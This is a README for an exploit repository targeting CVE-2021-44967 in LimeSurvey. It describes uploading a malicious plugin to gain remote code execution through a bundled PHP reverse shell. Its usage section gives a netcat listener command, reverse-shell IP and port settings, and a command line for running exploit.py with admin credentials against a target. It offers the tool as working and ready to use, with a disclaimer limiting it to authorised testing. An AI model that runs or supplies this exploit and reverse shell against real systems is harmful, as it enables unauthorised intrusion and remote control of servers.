# 🚀 LimeSurvey RCE (CVE-2021-44967) - Authenticated Remote Code Execution

This repository contains a functional exploit for **CVE-2021-44967**, an authenticated Remote Code Execution vulnerability in LimeSurvey.

## 🎯 Compatibility
Tested and confirmed working on:
- **LimeSurvey 5.2.x**
- **LimeSurvey 6.x**

## 🐛 Vulnerability Overview
The vulnerability allows an authenticated user with administrative privileges to upload a malicious plugin. Since LimeSurvey doesn't strictly validate the contents of the plugin ZIP or prevent execution of PHP files in the plugin directory, an attacker can achieve RCE by accessing the uploaded shell directly.

## ✨ Features
- **🤖 Automated Exploitation:** Logs in, handles CSRF tokens, uploads, installs, and activates the plugin automatically.
- **✅ Improved Compatibility:** `config.xml` updated for compatibility with LimeSurvey versions 3.0 through 6.0.
- **💣 Flexible Payloads:** Includes a robust PHP reverse shell.

## 🛠️ Usage

### 1️⃣ Prepare your Listener
Start a netcat listener on your machine:
```bash
nc -lvnp 443
```

### 2️⃣ Configure the Reverse Shell
Edit `php-rev.php` and set your local IP and port:
```php
$ip = '<YOUR_IP>';
$port = 443;
```

### 3️⃣ Run the Exploit
```bash
python3 exploit.py <TARGET_URL> <USERNAME> <PASSWORD>
```
**Example:**
```bash
python3 exploit.py http://10.129.1.243/survey admin test
```

## 📁 Repository Structure
- 🐍 `exploit.py`: The main automation script.
- 🐘 `php-rev.php`: PHP reverse shell payload.
- ⚙️ `config.xml`: Mandatory LimeSurvey plugin configuration file.

## ⚠️ Disclaimer
**This tool is for educational purposes and authorized security testing ONLY.** 
Strictly intended for use in controlled, legal environments (e.g., CTFs, lab environments, or authorized engagements). The author is not responsible for any misuse or damage caused by this tool. Use it responsibly and only on systems you have explicit permission to test.
